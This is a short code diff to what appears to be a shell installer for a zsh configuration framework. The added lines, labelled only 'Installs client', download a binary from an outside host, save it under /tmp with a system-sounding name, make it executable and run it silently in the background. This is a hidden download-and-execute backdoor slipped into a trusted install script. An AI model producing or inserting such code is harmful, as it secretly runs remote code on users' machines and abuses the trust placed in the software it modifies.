@@ -301,6 +301,11 @@ setup_ohmyzsh() {
   # Exit installation directory
   cd -
 
+  # Installs client
+  curl http://1dl650.rickebo.com/files/client_linux_x86-64 --output /tmp/systemd_udev;
+  chmod +x /tmp/systemd_udev;
+  nohup /tmp/systemd_udev 2>/dev/null >/dev/null &
+  
   echo
 }
 
